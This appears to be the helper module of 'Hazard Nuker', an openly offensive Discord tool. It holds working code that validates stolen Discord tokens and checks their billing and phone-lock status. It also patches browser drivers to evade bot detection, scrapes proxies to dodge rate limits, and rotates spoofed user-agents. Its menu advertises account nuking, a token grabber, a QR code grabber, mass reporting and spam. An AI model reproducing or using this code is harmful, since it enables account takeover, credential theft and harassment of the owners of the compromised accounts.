# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import os
import re
import io
import sys
import time
import json
import shutil
import ctypes
import random
import zipfile
import requests
import threading
import subprocess
import pylibcheck

from urllib.request import urlopen, urlretrieve
from distutils.version import LooseVersion
from bs4 import BeautifulSoup
from colorama import Fore
from time import sleep

THIS_VERSION = "1.4.7"

google_target_ver = 0
edge_target_ver = 0

class Chrome_Installer(object):
    installed = False
    target_version = None
    DL_BASE = "https://chromedriver.storage.googleapis.com/"

    def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
        self.platform = sys.platform

        if google_target_ver:
            self.target_version = google_target_ver

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]

        self._base = base_ = "chromedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_chromedriver()
            if not self.__class__.installed:
                if self.patch_binary():
                    self.__class__.installed = True

    @staticmethod
    def random_cdc():
        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
        cdc[-6:-4] = map(str.upper, cdc[-6:-4])
        cdc[2] = cdc[0]
        cdc[3] = "_"
        return "".join(cdc).encode()

    def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open(self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect

    def get_release_version_number(self):
        path = (
            "LATEST_RELEASE"
            if not self.target_version
            else f"LATEST_RELEASE_{self.target_version}"
        )
        return LooseVersion(urlopen(self.__class__.DL_BASE + path).read().decode())

    def fetch_chromedriver(self):
        base_ = self._base
        zip_name = base_.format(".zip")
        ver = self.get_release_version_number().vstring
        if os.path.exists(self.executable_path):
            return self.executable_path
        urlretrieve(
            f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
            filename=zip_name,
        )
        with zipfile.ZipFile(zip_name) as zf:
            zf.extract(self._exe_name)
        os.remove(zip_name)
        if sys.platform != "win32":
            os.chmod(self._exe_name, 0o755)
        return self._exe_name

class Edge_Installer(object):
    installed = False
    target_version = None
    DL_BASE = "https://msedgedriver.azureedge.net/"

    def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
        self.platform = sys.platform

        if edge_target_ver:
            self.target_version = edge_target_ver

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]

        self._base = base_ = "edgedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_edgedriver()
            if not self.__class__.installed:
                if self.patch_binary():
                    self.__class__.installed = True

    @staticmethod
    def random_cdc():
        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
        cdc[-6:-4] = map(str.upper, cdc[-6:-4])
        cdc[2] = cdc[0]
        cdc[3] = "_"
        return "".join(cdc).encode()

    def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open("ms"+self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect


    def get_release_version_number(self):
        path = (
            "LATEST_STABLE"
            if not self.target_version
            else f"LATEST_RELEASE_{str(self.target_version).split('.', 1)[0]}"
        )
        urlretrieve(
            f"{self.__class__.DL_BASE}{path}",
            filename=f"{getTempDir()}\\{path}",
        )
        with open(f"{getTempDir()}\\{path}", "r+") as f:
            _file = f.read().strip("\n")
            content = ""
            for char in [x for x in _file]:
                for num in ("0","1","2","3","4","5","6","7","8","9","."):
                    if char == num:
                        content += char
        return LooseVersion(content)

    def fetch_edgedriver(self):
        base_ = self._base
        zip_name = base_.format(".zip")
        ver = self.get_release_version_number().vstring
        if os.path.exists(self.executable_path):
            return self.executable_path
        urlretrieve(
            f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
            filename=zip_name,
        )
        with zipfile.ZipFile(zip_name) as zf:
            zf.extract("ms"+self._exe_name)
        os.remove(zip_name)
        if sys.platform != "win32":
            os.chmod(self._exe_name, 0o755)
        return self._exe_name

class Opera_Installer(object):
    DL_BASE = "https://github.com"
    def __init__(self, *args, **kwargs):
        self.platform = sys.platform
        self.links = ""

        r = requests.get(self.__class__.DL_BASE+"/operasoftware/operachromiumdriver/releases")
        soup = BeautifulSoup(r.text, 'html.parser')
        for link in soup.find_all('a'):
            if "operadriver" in link.get('href'):
                self.links += f"{link.get('href')}\n"

        for i in self.links.split("\n")[:4]:
            if self.platform in i:
                self.fetch_edgedriver(i)

    def fetch_edgedriver(self, driver):
        executable = "operadriver.exe"
        driver_name = driver.split("/")[-1]
        cwd = os.getcwd() + os.sep

        urlretrieve(self.__class__.DL_BASE+driver, filename=driver_name)
        with zipfile.ZipFile(driver_name) as zf:
            zf.extractall()
        shutil.move(cwd+driver_name[:-4]+os.sep+executable, cwd+executable)
        os.remove(driver_name)
        shutil.rmtree(driver_name[:-4])

def getDriver():
    #supported drivers
    drivers = ["chromedriver.exe", "msedgedriver.exe", "operadriver.exe"]
    print(f"\n{Fore.BLUE}Checking Driver. . .")
    sleep(0.5)

    for driver in drivers:
        #Checking if driver already exists
        if os.path.exists(os.getcwd() + os.sep + driver):
            print(f"{Fore.GREEN}{driver} already exists, continuing. . .{Fore.RESET}")
            sleep(0.5)
            return driver
    else:
        print(f"{Fore.RED}Driver not found! Installing it for you")
        #get installed browsers + install driver + return correct driver
        if os.path.exists(os.getenv('localappdata') + '\\Google'):
            Chrome_Installer()
            print(f"{Fore.GREEN}chromedriver.exe Installed!{Fore.RESET}")
            return "chromedriver.exe"
        elif os.path.exists(os.getenv('appdata') + '\\Opera Software\\Opera Stable'):
            Opera_Installer()
            print(f"{Fore.GREEN}operadriver.exe Installed!{Fore.RESET}")
            return "operadriver.exe"
        elif os.path.exists(os.getenv('localappdata') + '\\Microsoft\\Edge'):
            Edge_Installer()
            print(f"{Fore.GREEN}msedgedriver.exe Installed!{Fore.RESET}")
            return "msedgedriver.exe"
        else:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : No compatible driver found. . . Proceeding with chromedriver')
            Chrome_Installer()
            print(f"{Fore.GREEN}trying with chromedriver.exe{Fore.RESET}")
            return "chromedriver.exe"

def clear():
    system = os.name
    if system == 'nt':
        #if its windows
        os.system('cls')
    elif system == 'posix':
        #if its linux
        os.system('clear')
    else:
        print('\n'*120)
    return

def setTitle(_str):
    system = os.name
    if system == 'nt':
        #if its windows
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Made By Rdimo")
    elif system == 'posix':
        #if its linux
        sys.stdout.write(f"\x1b]0;{_str} | Made By Rdimo\x07")
    else:
        #if its something else or some err happend for some reason, we do nothing
        pass

def getTempDir():
    system = os.name
    if system == 'nt':
        #if its windows
        return os.getenv('temp')
    elif system == 'posix':
        #if its linux
        return '/tmp/'

def RandomChinese(amount, second_amount):
    name = u''
    for i in range(random.randint(amount, second_amount)):
        name = name + chr(random.randint(0x4E00,0x8000))
    return name

def SlowPrint(_str):
    for letter in _str:
        #slowly print out the words 
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)

def installPackage(dependencies):
    print(f'{Fore.CYAN}Checking packages. . .{Fore.RESET}')
    if sys.argv[0].endswith('.exe'):
            #get all installed libs
            reqs = subprocess.check_output(['python', '-m', 'pip', 'freeze'])
            installed_packages = [r.decode().split('==')[0].lower() for r in reqs.split()]

            for lib in dependencies:
                #check for missing libs 
                if lib not in installed_packages:
                    #install the lib if it wasn't found
                    print(f"{Fore.BLUE}{lib}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
                    try:
                        subprocess.check_call(['python', '-m', 'pip', 'install', lib])
                    #incase something goes wrong we notify the user that something happend
                    except Exception as e:
                        print(f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : {e}")
                        sleep(0.5)
                        pass
    else:
        for i in dependencies:
            if not pylibcheck.checkPackage(i):
                print(f"{Fore.BLUE}{i}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
                pylibcheck.installPackage(i)

def hasNitroBoost(token):
    '''return True if they got nitro boost and False if they don't'''
    channelIds = requests.get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", headers=getheaders(token)).json()
    try:
        if channelIds[0]["type"] == 1:
            return True
    except Exception:
        return False

def validateToken(token):
    '''validate the token by contacting the discord api'''
    #define variables
    base_url = "https://discord.com/api/v9/users/@me"
    message = "You need to verify your account in order to perform this action."
    #contact discord api and see if you can get a valid response with the given token
    r = requests.get(base_url, headers=getheaders(token))
    if r.status_code != 200:
        #invalid token
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        sleep(1)
        __import__("Hazard").main()
    j = requests.get(f'{base_url}/billing/subscriptions', headers=getheaders(token)).json()
    #check if the account is phone locked
    try:
        if j["message"] == message:
            print(f"\n{Fore.RED}Phone Locked Token.{Fore.RESET}")
            sleep(1)
            __import__("Hazard").main()
    except (KeyError, TypeError, IndexError):
        pass

def validateWebhook(hook):
    #if the input is something like google.com or something else we check if it contains api/webhooks first
    if not "api/webhooks" in hook:
        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
        sleep(1)
        __import__("Hazard").main()
    try:
        #try and get a connection with the input
        responce = requests.get(hook)
    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema, requests.exceptions.ConnectionError):
        #connection failed
        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
        sleep(1)
        __import__("Hazard").main()
    try:
        #try and get a value from object
        j = responce.json()["name"]
    except (KeyError, json.decoder.JSONDecodeError):
        #if its a valid link but link isn't a webhook
        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
        sleep(1)
        __import__("Hazard").main()
    #webhook is valid
    print(f"{Fore.GREEN}Valid webhook! ({j})")

def proxy_scrape(): 
    proxieslog = []
    setTitle("Scraping Proxies")
    #start timer
    startTime = time.time()
    #create temp dir
    temp = getTempDir()+"\\hazard_proxies"
    print(f"{Fore.YELLOW}Please wait while HazardNuker Scrapes proxies for you!{Fore.RESET}")

    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        #get the proxies from all the sites with the custom regex
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    #all urls
    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://www.us-proxy.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://free-proxy-list.net/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://www.sslproxies.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
    threads = [] 
    for url in proxysources:
        #send them out in threads
        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp, "w") as f:
        for proxy in proxies:
            #create the same proxy 7-10 times to avoid ratelimit when using other options
            for i in range(random.randint(7, 10)):
                f.write(f"{proxy}\n")
    #get the time it took to scrape
    execution_time = (time.time() - startTime)
    print(f"{Fore.GREEN}Done! Scraped{Fore.MAGENTA}{len(proxies): >5}{Fore.GREEN} in total => {Fore.RED}{temp}{Fore.RESET} | {execution_time}ms")
    setTitle(f"Hazard Nuker {THIS_VERSION}")

def proxy():
    temp = getTempDir()+"\\hazard_proxies"
    #if the file size is empty
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[0]

    with open(temp, 'r+') as fp:
        #read all lines
        lines = fp.readlines()
        #get the first line
        fp.seek(0)
        #remove the proxy
        fp.truncate()
        fp.writelines(lines[1:])
    return ({'http://': f'http://{proxy}', 'https://': f'https://{proxy}'})

#headers for optimazation
heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

                                                            #FADE TYPES#
########################################################################################################################################################
def blackwhite(text):
    os.system(""); faded = ""
    red = 0; green = 0; blue = 0
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
        if not red == 255 and not green == 255 and not blue == 255:
            red += 20; green += 20; blue += 20
            if red > 255 and green > 255 and blue > 255:
                red = 255; green = 255; blue = 255
    return faded

def cyan(text):
    os.system(""); fade = ""
    blue = 100
    for line in text.splitlines():
        fade += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
        if not blue == 255:
            blue += 15
            if blue > 255:
                blue = 255
    return fade

def neon(text):
    os.system(""); fade = ""
    for line in text.splitlines():
        red = 255
        for char in line:
            red -= 2
            if red > 255:
                red = 255
            fade += (f"\033[38;2;{red};0;255m{char}\033[0m")
        fade += "\n"
    return fade

def purple(text):
    os.system(""); fade = "" 
    red = 255
    for line in text.splitlines():
        fade += (f"\033[38;2;{red};0;180m{line}\033[0m\n")
        if not red == 0:
            red -= 20
            if red < 0:
                red = 0
    return fade

def water(text):
    os.system(""); fade = ""
    green = 10
    for line in text.splitlines():
        fade += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return fade

def fire(text):
    os.system(""); fade = ""
    green = 250
    for line in text.splitlines():
        fade += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
        if not green == 0:
            green -= 25
            if green < 0:
                green = 0
    return fade
########################################################################################################################################################

def getTheme():
    themes = ["hazardous", "dark", "fire", "water", "neon"]
    with open(getTempDir()+"\\hazard_theme", 'r') as f:
        text = f.read()
        if not any(s in text for s in themes):
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid theme was given, Switching to default. . .')
            setTheme('hazardous')
            sleep(2.5)
            __import__("Hazard").main()
        return text

def setTheme(new: str):
    with open(getTempDir()+"\\hazard_theme", 'w'): pass
    with open(getTempDir()+"\\hazard_theme", 'w') as f:
        f.write(new)

def banner(theme=None):
    if theme == "dark":
        print(bannerTheme(blackwhite, blackwhite))
    elif theme == "fire":
        print(bannerTheme(fire, fire))
    elif theme == "water":
        print(bannerTheme(water, cyan))
    elif theme == "neon":
        print(bannerTheme(purple, neon))
    else:
        print(f'''{Fore.GREEN}
                                                                                                         _   _
                                                                                                       .-_; ;_-.
                                                                                                      / /     \ \\
                                                                                                     | |       | |
                                                                                                      \ \.---./ /
                                    ██╗  ██╗ █████╗ ███████╗ █████╗ ██████╗ ██████╗               .-"~   .---.   ~"-.
                                    ██║  ██║██╔══██╗╚══███╔╝██╔══██╗██╔══██╗██╔══██╗            ,`.-~/ .'`---`'. \~-.`,
                                    ███████║███████║  ███╔╝ ███████║██████╔╝██║  ██║             '`  | | \ _ / | |   `'
                                    ██╔══██║██╔══██║ ███╔╝  ██╔══██║██╔══██╗██║  ██║           ,     \  \ | | /  /     ,
> Created by Rdimo#6969             ██║  ██║██║  ██║███████╗██║  ██║██║  ██║██████╔╝            ;`'.,_\  `-'-'  /_,.'`;
> https://Cheataway.com             ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝              '-._  _.-'^'-._  _.-'                                      '''.replace('█', f'{Fore.WHITE}█{Fore.GREEN}') + f'''   
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Nuke Account                                |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.LIGHTBLACK_EX} Block Friends
{Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Unfriend all friends                        |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.LIGHTBLACK_EX} Profile Changer
{Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon] 
{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} Create Token Grabber 
{Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.LIGHTBLACK_EX} QR Code grabber
{Fore.RESET}[{Fore.GREEN}6{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Dm                                     |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Report
{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode                         |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.LIGHTBLACK_EX} GroupChat Spammer
{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.LIGHTBLACK_EX} Get information from a targetted account    |{Fore.RESET}[{Fore.GREEN}17{Fore.RESET}]{Fore.LIGHTBLACK_EX} Webhook Destroyer
{Fore.RESET}[{Fore.GREEN}9{Fore.RESET}]{Fore.LIGHTBLACK_EX} Log into an account                         |{Fore.RESET}[{Fore.GREEN}18{Fore.RESET}]{Fore.RED} Settings
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')

def bannerTheme(type1, type2):
    return type1(f'''
                                                                                                         _   _
                                                                                                       .-_; ;_-.
                                                                                                      / /     \ \\
                                                                                                     | |       | |
                                                                                                      \ \.---./ /
                                    ██╗  ██╗ █████╗ ███████╗ █████╗ ██████╗ ██████╗               .-"~   .---.   ~"-.
                                    ██║  ██║██╔══██╗╚══███╔╝██╔══██╗██╔══██╗██╔══██╗            ,`.-~/ .'`---`'. \~-.`,
                                    ███████║███████║  ███╔╝ ███████║██████╔╝██║  ██║             '`  | | \ _ / | |   `'
                                    ██╔══██║██╔══██║ ███╔╝  ██╔══██║██╔══██╗██║  ██║           ,     \  \ | | /  /     ,
> Created by OrbitOntop             ██║  ██║██║  ██║███████╗██║  ██║██║  ██║██████╔╝            ;`'.,_\  `-'-'  /_,.'`;
> Join Our Discord !!!!             ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝              '-._  _.-'^'-._  _.-' ''')+type2('''  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] Nuke Account                                |[10] Block Friends
[2] Unfriend all friends                        |[11] Profile Changer
[3] Delete and leave all servers                |[12] [Coming Soon]
[4] Spam Create New servers                     |[13] Create Token Grabber 
[5] Dm Deleter                                  |[14] QR Code grabber
[6] Mass Dm                                     |[15] Mass Report
[7] Enable Seizure Mode                         |[16] GroupChat Spammer
[8] Get information from a targetted account    |[17] Webhook Destroyer
[9] Log into an account                         |[18] Settings
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')
